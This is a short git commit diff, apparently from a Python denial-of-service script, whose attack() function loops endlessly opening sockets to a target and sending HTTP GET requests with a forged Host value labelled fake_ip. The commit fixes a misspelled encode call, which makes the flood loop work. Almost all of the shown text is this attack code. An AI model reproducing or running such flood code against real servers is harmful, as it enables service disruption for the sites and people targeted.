d839d605110f55f73191995ed0278ba263638b2f
lexstoj <81991804+lexstoj@users.noreply.github.com>
2022-05-03 18:49:06 -0400

    Update main.py

--- main.py
+++ main.py
@@ -9,7 +9,7 @@ def attack():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
-        s.sendto(("GET /" + target + "HTTP/1.1\r\n").enocde('ascii'), (target, port))
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
         s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
         s.close()
 
